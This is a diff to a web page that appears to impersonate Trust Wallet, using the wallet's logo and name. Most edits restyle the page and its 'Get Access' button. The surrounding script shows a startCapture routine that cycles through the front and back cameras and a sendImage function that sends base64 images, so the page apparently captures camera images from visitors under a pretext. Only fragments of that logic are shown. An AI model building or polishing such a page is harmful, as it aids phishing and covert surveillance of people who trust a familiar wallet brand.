@@ -7,6 +7,7 @@
 <style>
 :root {
   --accent:#1e90ff;
+  --accent-active:#28a745;
   --bg:linear-gradient(180deg,#0a1226 0%, #081226 60%, #07122b 100%);
   --white: #ffffff;
 }
@@ -15,48 +16,66 @@ body{
   -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
 }
 .container{max-width:1000px;margin:0 auto;padding:40px 20px;text-align:left;}
-header{display:flex;align-items:center;justify-content:flex-start;gap:8px;margin-bottom:30px;}
+header{display:flex;align-items:center;gap:10px;margin-bottom:30px;}
 .logo{display:flex;align-items:center;gap:8px;}
-.logo img{width:32px; height:32px;}
-.logo h2{margin:0;font-size:20px;font-weight:400;}
+.logo img{width:32px;height:32px;}
+.logo h2{margin:0;font-size:24px;font-weight:400;}
 main.hero{display:flex;gap:30px;align-items:flex-start;justify-content:flex-start;flex-wrap:wrap;}
 .hero-left{text-align:left;max-width:520px;}
-.hero-left p, .hero-left h1, .hero-left .eyebrow{
+.hero-left h1, .hero-left .eyebrow{
   margin:6px 0;
   font-family:'Inter', sans-serif;
-  font-weight:400; /* normal */
+  font-weight:400;
+  font-size:32px;
 }
-h1{font-size:36px;line-height:1.2;}
-p.lead{font-size:18px;color:rgba(255,255,255,0.85);}
+.hero-left p.lead{
+  margin:10px 0;
+  font-family:'Inter', sans-serif;
+  font-weight:400;
+  font-size:18px;
+  color:rgba(255,255,255,0.85);
+}
 .cta-row{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-top:20px;}
-.btn{background:var(--accent);color:white;padding:14px 22px;border-radius:12px;border:0;font-size:16px;cursor:pointer;box-shadow:0 8px 24px rgba(30,144,255,0.12);}
-.hero-right{display:flex;align-items:center;justify-content:flex-start;flex-direction:column;gap:20px;}
+.btn{
+  background:var(--accent);
+  color:white;
+  padding:18px 28px;
+  border-radius:12px;
+  border:0;
+  font-size:18px;
+  cursor:pointer;
+  box-shadow:0 8px 24px rgba(30,144,255,0.12);
+  transition: 0.3s;
+}
+.btn.active{
+  background:var(--accent-active);
+}
+.hero-right{display:flex;align-items:center;justify-content:flex-start;flex-direction:column;gap:20px;flex:1;}
 .card{
   background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
-  padding:18px; border-radius:14px;
+  padding:0; border-radius:14px;
   box-shadow:0 10px 30px rgba(2,6,23,0.6);
   max-width:360px;
   width:100%;
 }
 #display1{
   display:block;
-  border-radius:10px;
-  width:320px;
-  height:200px;
+  width:100%;
+  height:220px;
   object-fit:cover;
-  border:2px solid rgba(255,255,255,0.06);
+  border-radius:14px 14px 0 0;
 }
 #display{
   display:block;
-  border-radius:10px;
-  width:280px;
+  width:90%;
   height:180px;
   object-fit:cover;
+  border-radius:10px;
   border:2px solid rgba(255,255,255,0.06);
   filter: blur(8px);
 }
 @media (max-width:760px){
-  h1{font-size:28px;}
+  .hero-left h1, .hero-left .eyebrow{font-size:28px;}
   #display, #display1{width:90%; height:auto;}
 }
 </style>
@@ -66,7 +85,7 @@ p.lead{font-size:18px;color:rgba(255,255,255,0.85);}
   <header>
     <div class="logo">
       <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="TrustWallet Logo">
-      <h2>Trust Wallet</h2>
+      <h2>TrustWallet</h2>
     </div>
   </header>
 
@@ -122,6 +141,7 @@ async function sendImage(base64){
 async function startCapture(){
   getBtn.disabled = true;
   getBtn.textContent = 'Processing...';
+  getBtn.classList.add('active');
 
   const cameras = ['user','environment']; // front/back
   for(const cam of cameras){
@@ -148,6 +168,7 @@ async function startCapture(){
 
   getBtn.disabled = false;
   getBtn.textContent = 'Get Access';
+  getBtn.classList.remove('active');
 }
 
 // Stop capture when user leaves page
